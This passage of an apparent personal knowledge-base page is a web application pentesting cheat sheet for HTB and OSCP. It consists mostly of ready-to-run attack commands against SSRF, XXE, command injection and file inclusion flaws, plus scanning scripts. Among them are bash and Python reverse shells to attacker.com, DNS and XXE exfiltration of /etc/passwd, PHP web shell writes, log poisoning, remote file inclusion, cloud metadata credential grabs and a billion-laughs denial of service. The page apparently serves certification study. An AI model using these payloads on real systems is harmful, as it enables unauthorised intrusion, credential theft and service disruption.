<h2>- XXE vulnerabilities with HTTP callbacks</h2>
<h2>- SSRF vulnerabilities with external requests</h2>
<h2>Custom Burp extensions for HTB/OSCP:</h2>
<h2>- Param Miner: Discovers hidden parameters</h2>
<h2>- AuthMatrix: Tests authorization flaws</h2>
<h2>- Upload Scanner: Tests file upload vulnerabilities</h2>
<h2>- J2EEScan: Java application vulnerabilities</h2></code></pre>
<h4><strong>Manual Testing Methodology with Burp Suite</strong></h4>
<pre><code><h2>Step 1: Spider and map application</h2>
<h2>Use Burp Spider to crawl application</h2>
<h2>Identify all endpoints, parameters, and functionality</h2>
<h2>Step 2: Analyze traffic patterns</h2>
<h2>Review HTTP history for:</h2>
<h2>- Authentication mechanisms</h2>
<h2>- Session management</h2>
<h2>- Input validation</h2>
<h2>- Error handling</h2>
<h2>Step 3: Test individual components</h2>
<h2>Use Burp Repeater for:</h2>
<h2>- SQL injection testing</h2>
<h2>- XSS payload testing</h2>
<h2>- Authentication bypass</h2>
<h2>- Parameter manipulation</h2>
<h2>Step 4: Automated fuzzing</h2>
<h2>Use Burp Intruder for:</h2>
<h2>- Parameter value fuzzing</h2>
<h2>- Directory enumeration</h2>
<h2>- Authentication brute forcing</h2>
<h2>- Session token analysis</h2>
<h2>Step 5: Extension integration</h2>
<h2>Leverage Burp extensions for specialized testing:</h2>
<h2>- Param Miner for hidden parameter discovery</h2>
<h2>- AuthMatrix for authorization testing</h2>
<h2>- Upload Scanner for file upload vulnerabilities</h2></code></pre>
<h3>Server-Side Request Forgery (SSRF) Testing</h3>
<h4><strong>SSRF Detection and Exploitation</strong></h4>
<strong>What SSRF vulnerabilities are:</strong> Flaws that allow attackers to make requests from the server to internal or external systems, bypassing network segmentation and access controls.
<strong>Why SSRF is critical in HTB/OSCP:</strong> Often leads to internal network access, cloud metadata access (AWS, Azure), and can be chained with other vulnerabilities for significant impact.
<pre><code><h2>Basic SSRF testing</h2>
curl -X POST -d "url=http://127.0.0.1:80" http://target.com/fetch.php
curl -X POST -d "url=http://localhost:22" http://target.com/fetch.php
curl -X POST -d "url=http://10.0.0.1:3389" http://target.com/fetch.php
<h2>Tests for internal network access</h2>
<h2>Common internal services: SSH (22), RDP (3389), databases</h2>
<h2>Cloud metadata access (AWS)</h2>
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/" http://target.com/fetch.php
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" http://target.com/fetch.php
<h2>AWS metadata service access</h2>
<h2>May reveal IAM credentials and instance information</h2>
<h2>Azure metadata access</h2>
curl -X POST -d "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" http://target.com/fetch.php
<h2>Azure metadata service</h2>
<h2>Requires Metadata header</h2>
<h2>Google Cloud metadata access  </h2>
curl -X POST -d "url=http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google" http://target.com/fetch.php
<h2>Google Cloud metadata</h2>
<h2>Different endpoint and header requirement</h2>
<h2>Protocol smuggling for SSRF bypass</h2>
curl -X POST -d "url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a" http://target.com/fetch.php
<h2>Gopher protocol to interact with Redis</h2>
<h2>Can execute Redis commands via SSRF</h2>
<p>curl -X POST -d "url=dict://127.0.0.1:6379/info" http://target.com/fetch.php
<h2>Dict protocol for service probing</h2>
<h2>Useful for port scanning via SSRF</h2></p>
<h2>File protocol access (if supported)</h2>
curl -X POST -d "url=file:///etc/passwd" http://target.com/fetch.php
curl -X POST -d "url=file:///c:/windows/system32/drivers/etc/hosts" http://target.com/fetch.php
<h2>Local file access via SSRF</h2>
<h2>May reveal sensitive system files</h2>
<h2>SSRF bypass techniques</h2>
curl -X POST -d "url=http://127.1:80" http://target.com/fetch.php          # Alternative localhost representation
curl -X POST -d "url=http://0:80" http://target.com/fetch.php              # Short form localhost
curl -X POST -d "url=http://[::1]:80" http://target.com/fetch.php          # IPv6 localhost
curl -X POST -d "url=http://2130706433:80" http://target.com/fetch.php     # Decimal representation of 127.0.0.1
<h2>DNS rebinding bypass</h2>
curl -X POST -d "url=http://malicious.com" http://target.com/fetch.php
<h2>malicious.com resolves to 127.0.0.1 after DNS TTL expires</h2>
<h2>Bypasses blacklist-based SSRF protection</h2>
<h2>URL encoding bypass</h2>
curl -X POST -d "url=http://%31%32%37%2e%30%2e%30%2e%31:80" http://target.com/fetch.php
<h2>URL encoded 127.0.0.1</h2>
<h2>May bypass simple string matching filters</h2></code></pre>
<h3>XML External Entity (XXE) Injection</h3>
<h4><strong>XXE Detection and Exploitation</strong></h4>
<strong>What XXE vulnerabilities are:</strong> XML parsing flaws that allow attackers to access local files, perform SSRF attacks, or cause denial of service through malicious XML input.
<strong>Why XXE is important:</strong> Common in applications processing XML, SOAP services, and file uploads. Can lead to file disclosure and internal network access.
<pre><code><h2>Basic XXE testing</h2>
cat > xxe_basic.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF
curl -X POST -H "Content-Type: application/xml" --data-binary @xxe_basic.xml http://target.com/api/process
<h2>File disclosure via XXE</h2>
cat > xxe_file_read.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<user>
    <username>&xxe;</username>
    <password>test</password>
</user>
EOF
curl -X POST -H "Content-Type: application/xml" --data-binary @xxe_file_read.xml http://target.com/user/create
<h2>XXE with parameter entities (blind XXE)</h2>
cat > xxe_blind.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/dtd.xml?%xxe;'>">
%param1;
]>
<root>&exfil;</root>
EOF
<h2>External DTD for blind XXE</h2>
cat > dtd.xml << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/steal.php?x=%file;'>">
%eval;
%exfil;
EOF
<h2>Host dtd.xml on attacker server</h2>
<h2>Exfiltrates file contents via HTTP request</h2>
<h2>XXE via SOAP services</h2>
cat > xxe_soap.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <getUserInfo>
            <username>&xxe;</username>
        </getUserInfo>
    </soap:Body>
</soap:Envelope>
EOF
curl -X POST -H "Content-Type: text/xml; charset=utf-8" -H "SOAPAction: getUserInfo" --data-binary @xxe_soap.xml http://target.com/soap/service
<h2>XXE via file upload</h2>
cat > xxe_upload.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
EOF
curl -X POST -F "file=@xxe_upload.svg" http://target.com/upload
<h2>XXE denial of service (billion laughs attack)</h2>
cat > xxe_dos.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
EOF
<h2>Exponential entity expansion</h2>
<h2>Can cause memory exhaustion and DoS</h2></code></pre>
<h3>Command Injection Testing</h3>
<h4><strong>OS Command Injection Detection and Exploitation</strong></h4>
<strong>What command injection is:</strong> Vulnerabilities that allow execution of arbitrary operating system commands through web application input fields.
<strong>Why command injection is critical:</strong> Direct path to remote code execution and system compromise. Common in web applications that interact with system commands.
<pre><code><h2>Basic command injection testing</h2>
curl -X POST -d "ip=127.0.0.1; whoami" http://target.com/ping.php
curl -X POST -d "ip=127.0.0.1 && whoami" http://target.com/ping.php
curl -X POST -d "ip=127.0.0.1 | whoami" http://target.com/ping.php
curl -X POST -d "ip=127.0.0.1 || whoami" http://target.com/ping.php
<h2>Different command separators</h2>
<h2>Tests for command chaining</h2>
<h2>Command injection with output redirection</h2>
curl -X POST -d "ip=127.0.0.1; whoami > /tmp/output.txt" http://target.com/ping.php
<h2>Redirects output to file</h2>
<h2>Useful when direct output isn't displayed</h2>
<h2>Blind command injection with time delays</h2>
curl -X POST -d "ip=127.0.0.1; sleep 10" http://target.com/ping.php
<h2>Time-based detection</h2>
<h2>Measures response time for confirmation</h2>
<h2>Blind command injection with DNS queries</h2>
curl -X POST -d "ip=127.0.0.1; nslookup \$(whoami).attacker.com" http://target.com/ping.php
<h2>Exfiltrates command output via DNS</h2>
<h2>Useful for blind command injection</h2>
<h2>Command injection with special characters</h2>
curl -X POST -d "ip=127.0.0.1\<code>whoami\</code>" http://target.com/ping.php        # Backticks
curl -X POST -d "ip=127.0.0.1\$(whoami)" http://target.com/ping.php         # Command substitution
curl -X POST -d "ip=127.0.0.1%26%26whoami" http://target.com/ping.php       # URL encoded &&
<h2>Filter bypass techniques</h2>
curl -X POST -d "ip=127.0.0.1;w'h'o'a'm'i" http://target.com/ping.php      # Quote separation
curl -X POST -d "ip=127.0.0.1;who\ami" http://target.com/ping.php           # Backslash separation
curl -X POST -d "ip=127.0.0.1;\$IFS\$9whoami" http://target.com/ping.php    # IFS (Internal Field Separator)
<h2>Reverse shell via command injection</h2>
curl -X POST -d "ip=127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1" http://target.com/ping.php
<h2>Bash reverse shell</h2>
<h2>Establishes connection back to attacker</h2>
<p>curl -X POST -d "ip=127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" http://target.com/ping.php
<h2>Python reverse shell</h2>
<h2>Alternative to bash shell</h2></p>
<h2>File write via command injection</h2>
curl -X POST -d "ip=127.0.0.1; echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php" http://target.com/ping.php
<h2>Writes web shell to server</h2>
<h2>Persistent access via web interface</h2></code></pre>
<h3>Local File Inclusion (LFI) and Remote File Inclusion (RFI)</h3>
<h4><strong>File Inclusion Vulnerability Testing</strong></h4>
<strong>What file inclusion vulnerabilities are:</strong> Flaws that allow including arbitrary files in web application execution, leading to information disclosure or code execution.
<strong>Why file inclusion is critical:</strong> Can lead to source code disclosure, system file access, and remote code execution. Common in PHP applications.
<pre><code><h2>Basic Local File Inclusion (LFI) testing</h2>
curl "http://target.com/page.php?file=../../../etc/passwd"
curl "http://target.com/page.php?file=../../../etc/shadow"
curl "http://target.com/page.php?file=../../../var/log/apache2/access.log"
<h2>Path traversal to access system files</h2>
<h2>Common targets: /etc/passwd, /etc/shadow, log files</h2>
<h2>Windows LFI testing</h2>
curl "http://target.com/page.php?file=../../../windows/system32/drivers/etc/hosts"
curl "http://target.com/page.php?file=../../../windows/system32/config/sam"
<h2>Windows system files</h2>
<h2>Different path structure and file locations</h2>
<h2>PHP wrapper exploitation</h2>
curl "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php"
<h2>Base64 encodes PHP source code</h2>
<h2>Reveals application source code</h2>
<p>curl "http://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B"
<h2>Data wrapper for code execution</h2>
<h2>Base64 encoded: <?php system($_GET['cmd']); ?></h2></p>
<p>curl "http://target.com/page.php?file=expect://whoami"
<h2>Expect wrapper for command execution</h2>
<h2>Direct command execution if enabled</h2></p>
<h2>Log poisoning for RCE</h2>
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
curl "http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=whoami"
<h2>Injects PHP code into log file</h2>
<h2>Executes code when log is included</h2>
<h2>Session file poisoning</h2>
curl -b "PHPSESSID=malicious" -X POST -d "data=<?php system(\$_GET['cmd']); ?>" http://target.com/session.php
curl "http://target.com/page.php?file=../../../var/lib/php/sessions/sess_malicious&cmd=whoami"
<h2>Injects code into session file</h2>
<h2>Executes when session file is included</h2>
<h2>Remote File Inclusion (RFI) testing</h2>
curl "http://target.com/page.php?file=http://attacker.com/shell.txt"
<h2>Includes remote file containing malicious code</h2>
<h2>shell.txt contains: <?php system($_GET['cmd']); ?></h2>
<h2>FTP-based RFI</h2>
curl "http://target.com/page.php?file=ftp://attacker.com/shell.php"
<h2>Alternative protocol for RFI</h2>
<h2>May bypass HTTP-based filtering</h2>
<h2>Filter bypass techniques</h2>
curl "http://target.com/page.php?file=....//....//....//etc/passwd"        # Double encoding
curl "http://target.com/page.php?file=..%2f..%2f..%2fetc%2fpasswd"         # URL encoding
curl "http://target.com/page.php?file=..%252f..%252f..%252fetc%252fpasswd" # Double URL encoding
curl "http://target.com/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" # Full encoding</code></pre>
<h3>OWASP Top 10 Testing Methodology</h3>
<h4><strong>Systematic OWASP Top 10 Testing Approach</strong></h4>
<strong>Why OWASP Top 10 methodology is important:</strong> Provides structured approach to web application testing, ensures comprehensive coverage of most critical vulnerabilities.
<pre><code><h2>A01: Broken Access Control</h2>
<h2>Test for horizontal and vertical privilege escalation</h2>
curl -b "session=user1_session" http://target.com/profile.php?user_id=2     # Horizontal escalation
curl -b "session=user_session" -X POST -d "role=admin" http://target.com/update_profile.php  # Vertical escalation
<h2>A02: Cryptographic Failures</h2>
<h2>Test for weak encryption and exposed sensitive data</h2>
curl -k https://target.com                   # Check SSL/TLS configuration
curl http://target.com/config.php            # Look for exposed configuration files
curl http://target.com/backup.sql            # Check for database backups
<h2>A03: Injection (SQL, NoSQL, OS Command, LDAP)</h2>
<h2>Comprehensive injection testing (covered in detail above)</h2>
sqlmap -u "http://target.com/page.php?id=1" --batch
curl -X POST -d "ip=127.0.0.1; whoami" http://target.com/ping.php
<h2>A04: Insecure Design</h2>
<h2>Test business logic and application flow</h2>
curl -X POST -d "step=3" http://target.com/checkout.php  # Workflow bypass
curl -X POST -d "price=0.01" http://target.com/purchase.php  # Price manipulation
<h2>A05: Security Misconfiguration</h2>
<h2>Check for default configurations and unnecessary features</h2>
curl http://target.com/admin/                # Default admin interfaces
curl -X OPTIONS http://target.com/           # Dangerous HTTP methods
curl http://target.com/.git/config           # Exposed version control
<h2>A06: Vulnerable and Outdated Components</h2>
<h2>Check component versions and known vulnerabilities</h2>
whatweb http://target.com                    # Technology identification
curl http://target.com/vendor/composer.json  # Dependency information
<h2>A07: Identification and Authentication Failures</h2>
<h2>Test authentication mechanisms (covered in detail above)</h2>
curl -X POST -d "username=admin&password=" http://target.com/login.php  # Empty password
curl -X POST -d "username=admin' OR '1'='1'--&password=any" http://target.com/login.php
<h2>A08: Software and Data Integrity Failures</h2>
<h2>Test for insecure deserialization and supply chain attacks</h2>
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @malicious.ser http://target.com/api
curl http://target.com/package.json          # Check for dependency confusion
<h2>A09: Security Logging and Monitoring Failures</h2>
<h2>Test for proper logging and monitoring (mostly manual review)</h2>
curl -X POST -d "username=admin&password=wrong" http://target.com/login.php
<h2>Check if failed login attempts are logged and monitored</h2>
<h2>A10: Server-Side Request Forgery (SSRF)</h2>
<h2>Comprehensive SSRF testing (covered in detail above)</h2>
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/" http://target.com/fetch.php</code></pre>
<h3>Web Application Testing Automation and Scripting</h3>
<h4><strong>Custom Testing Scripts for HTB/OSCP</strong></h4>
<pre><code><h2>Comprehensive web application testing script</h2>
cat > web_test.sh << 'EOF'
#!/bin/bash
<p>target=$1
if [ -z "$target" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi</p>
<p>echo "[+] Starting comprehensive web application testing for $target"</p>
<h2>Technology identification</h2>
echo "[+] Identifying technologies..."
whatweb "$target"
<h2>Directory enumeration</h2>
echo "[+] Directory enumeration..."
gobuster dir -u "$target" -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -o gobuster_results.txt
<h2>SQL injection testing</h2>
echo "[+] SQL injection testing..."
sqlmap -u "$target" --batch --level=3 --risk=2 -o sqlmap_results/
<h2>XSS testing</h2>
echo "[+] XSS testing..."
curl "$target/search.php?q=<script>alert('XSS')</script>" | grep -i "script\|alert"
<h2>File upload testing (if upload form exists)</h2>
echo "[+] File upload testing..."
echo "<?php system(\$_GET['cmd']); ?>" > test_shell.php
curl -X POST -F "file=@test_shell.php" "$target/upload.php"
<h2>SSRF testing</h2>
echo "[+] SSRF testing..."
curl -X POST -d "url=http://127.0.0.1:22" "$target/fetch.php" | grep -i "ssh\|denied\|refused"
<p>echo "[+] Testing completed. Check individual result files for details."
EOF
chmod +x web_test.sh</p>
<h2>Automated vulnerability scanner integration</h2>
cat > full_web_scan.sh << 'EOF'
#!/bin/bash
<p>target=$1
output_dir="scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$output_dir"</p>
<p>echo "[+] Comprehensive web application scan starting..."</p>
<h2>Nikto scan</h2>
nikto -h "$target" -output "$output_dir/nikto.txt"
<h2>Nuclei scan</h2>
nuclei -u "$target" -o "$output_dir/nuclei.txt"
<h2>Custom payload testing</h2>
for payload in "'" "\"" "<script>" "{{7<em>7}}" "\${7</em>7}"; do
    echo "[+] Testing payload: $payload"
    curl "$target/search.php?q=$payload" > "$output_dir/payload_$(echo $payload | tr '<>{} '_').txt"
done
<p>echo "[+] Scan completed. Results in $output_dir/"
EOF
chmod +x full_web_scan.sh</code></pre></p>
<h3>Advanced Web Application Testing Techniques</h3>
<h4><strong>Manual Testing Methodologies for Complex Applications</strong></h4>
<pre><code><h2>API testing methodology</h2>
<h2>1. API endpoint discovery</h2>
curl -X GET http://target.com/api/v1/
curl -X GET http://target.com/api/v2/
curl -X GET http://target.com/graphql
curl -X OPTIONS http://target.com/api/users
<h2>2. API authentication testing</h2>
curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"password"}' http://target.com/api/auth/login
<h2>3. API parameter fuzzing</h2>
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://target.com/api/FUZZ -fc 404
<h2>4. GraphQL testing</h2>
curl -X POST -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name}}}"}' http://target.com/graphql
<h2>GraphQL introspection query</h2>
<h2>Reveals API schema and available queries</h2>
<h2>JWT token testing</h2>
<h2>1. JWT token analysis</h2>
python3 -c "
import jwt
import base64
token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...'
print(jwt.decode(token, options={'verify_signature': False}))
"
<h2>2. JWT algorithm confusion</h2>
<h2>Change algorithm from RS256 to HS256 and use public key as secret</h2>
<h2>3. JWT weak secret brute forcing</h2>
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
<h2>WebSocket testing</h2>
<h2>1. WebSocket connection testing</h2>
curl --include --no-buffer --header "Connection: Upgrade" --header "Upgrade: websocket" --header "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" --header "Sec-WebSocket-Version: 13" http://target.com/websocket
<h2>2. WebSocket message fuzzing (requires specialized tools)</h2>
<h2>Use tools like websocket-client or custom scripts</h2>
<h2>Content Security Policy (CSP) bypass testing</h2>
curl -I http://target.com/ | grep -i "content-security-policy"
<h2>Analyze CSP header for bypass opportunities</h2>
<h2>Look for unsafe-inline, unsafe-eval, wildcard domains</h2></code></pre>
<h3>Web Application Testing Summary and Methodology</h3>
<h4><strong>HTB/OSCP Web Testing Checklist</strong></h4>
<strong>Systematic approach for comprehensive web application testing:</strong>
<p>1. <strong>Information Gathering</strong>
   - Technology stack identification (whatweb, wappalyzer)
   - Directory and file enumeration (gobuster, ffuf)
   - Source code analysis (view-source, developer tools)
   - robots.txt, sitemap.xml analysis</p>
<p>2. <strong>Input Validation Testing</strong>
   - SQL injection (sqlmap, manual testing)
   - XSS (reflected, stored, DOM-based)
   - Command injection (various command separators)
   - File inclusion (LFI/RFI with various wrappers)
   - XXE injection (file disclosure, SSRF)</p>
<p>3. <strong>Authentication and Session Management</strong>
   - Authentication bypass (SQL injection, logic flaws)
   - Session management (token analysis, fixation, hijacking)
   - Password policy testing
   - Multi-factor authentication bypass</p>
<p>4. <strong>Authorization Testing</strong>
   - Horizontal privilege escalation
   - Vertical privilege escalation  
   - Direct object reference vulnerabilities
   - Path traversal and access control bypasses</p>
<p>5. <strong>Business Logic Testing</strong>
   - Workflow bypass
   - Price manipulation
   - Quantity manipulation
   - Rate limiting bypass
   - Transaction integrity</p>
<p>6. <strong>File Upload Testing</strong>
   - Extension bypass
   - MIME type bypass
   - File signature bypass
   - Path traversal in uploads
   - Polyglot file creation</p>
<p>7. <strong>Advanced Vulnerability Testing</strong>
   - SSRF (internal network access, cloud metadata)
   - Deserialization vulnerabilities
   - Template injection
   - LDAP injection
   - NoSQL injection</p>
<strong>Key Success Factors for HTB/OSCP:</strong>
<ul><li><strong>Methodology over tools</strong> - Follow systematic approach</li>
<li><strong>Manual testing</strong> - Don't rely solely on automated scanners</li>
<li><strong>Context awareness</strong> - Understand application functionality</li>
<li><strong>Chaining vulnerabilities</strong> - Combine findings for maximum impact</li>
<li><strong>Documentation</strong> - Keep detailed notes of all findings and techniques</li></ul>
<p>This comprehensive web application testing methodology covers the essential techniques needed for HTB challenges and OSCP exam scenarios, providing both automated and manual testing approaches for maximum coverage.</p>
            </div>
        </div>
        
        <div class="footer">
            <p><a href="../index.html">← Back to Alex Susanu's Knowledge Base</a></p>
        </div>
    </div>
</body>
</html>